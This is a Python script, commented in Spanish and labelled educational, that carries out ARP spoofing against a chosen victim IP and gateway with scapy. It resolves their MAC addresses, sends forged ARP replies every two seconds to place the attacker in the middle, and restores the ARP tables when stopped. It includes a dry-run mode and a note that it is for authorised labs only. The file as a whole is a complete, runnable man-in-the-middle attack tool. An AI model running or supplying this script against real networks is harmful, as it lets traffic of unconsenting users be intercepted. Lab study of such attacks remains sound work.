#!/usr/bin/env python3
"""
ARP spoofing (MitM) educational script

Este script realiza envenenamiento ARP entre una víctima y su gateway.
Incluye restauración de ARP al finalizar y una opción `--dry-run`.

USO RESPONSABLE: Solo en laboratorios autorizados.
"""

import argparse
import time
import os
import sys
from scapy.all import ARP, Ether, srp, send, sendp, conf


def is_root():
    try:
        return os.geteuid() == 0
    except AttributeError:
        return True


def get_mac(ip, iface=None, timeout=2):
    pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    ans, _ = srp(pkt, timeout=timeout, retry=2, iface=iface, verbose=False)
    for _, r in ans:
        return r[Ether].src
    return None


def poison(victim_ip, victim_mac, gateway_ip, gateway_mac, iface=None, dry_run=False):
    # ARP reply: tell victim that gateway IP is at our MAC
    our_mac = conf.iface_mac
    pkt_victim = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
    pkt_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
    if dry_run:
        print(f"[DRY] Enviar a víctima: {pkt_victim.summary()}")
        print(f"[DRY] Enviar a gateway: {pkt_gateway.summary()}")
        return
    send(pkt_victim, iface=iface, verbose=False)
    send(pkt_gateway, iface=iface, verbose=False)


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac, iface=None):
    # Send correct ARP mappings
    pkt_victim = ARP(op=2, pdst=victim_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=gateway_ip, hwsrc=gateway_mac)
    pkt_gateway = ARP(op=2, pdst=gateway_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=victim_ip, hwsrc=victim_mac)
    send(pkt_victim, iface=iface, count=5, verbose=False)
    send(pkt_gateway, iface=iface, count=5, verbose=False)


def main():
    parser = argparse.ArgumentParser(description='ARP spoofing (educational)')
    parser.add_argument('--iface', default='eth0')
    parser.add_argument('--victim-ip', required=True)
    parser.add_argument('--gateway-ip', required=True)
    parser.add_argument('--dry-run', action='store_true')
    args = parser.parse_args()

    if not args.dry_run and not is_root():
        print('Se requieren privilegios de root (o use --dry-run).')
        sys.exit(1)

    print('Obteniendo MACs...')
    victim_mac = get_mac(args.victim_ip, iface=args.iface)
    gateway_mac = get_mac(args.gateway_ip, iface=args.iface)
    if not victim_mac:
        print('No se pudo obtener MAC de la víctima')
        sys.exit(1)
    if not gateway_mac:
        print('No se pudo obtener MAC del gateway')
        sys.exit(1)

    print(f'Victim {args.victim_ip} -> {victim_mac}')
    print(f'Gateway {args.gateway_ip} -> {gateway_mac}')

    print('Habilite IP forwarding en el host atacante si desea reenviar tráfico.')

    try:
        while True:
            poison(args.victim_ip, victim_mac, args.gateway_ip, gateway_mac, iface=args.iface, dry_run=args.dry_run)
            time.sleep(2)
    except KeyboardInterrupt:
        print('\nRestaurando tablas ARP...')
        restore(args.victim_ip, victim_mac, args.gateway_ip, gateway_mac, iface=args.iface)
        print('Restauración completa.')


if __name__ == '__main__':
    main()
